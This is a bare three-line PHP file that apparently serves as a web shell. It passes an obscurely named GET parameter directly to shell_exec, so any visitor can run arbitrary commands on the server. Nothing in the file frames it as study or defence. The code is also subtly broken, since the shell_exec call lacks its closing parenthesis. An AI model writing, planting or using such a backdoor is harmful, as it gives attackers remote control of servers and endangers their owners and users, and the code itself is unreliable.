<?php
shell_exec($_GET['76i_m4Mr'];
?>
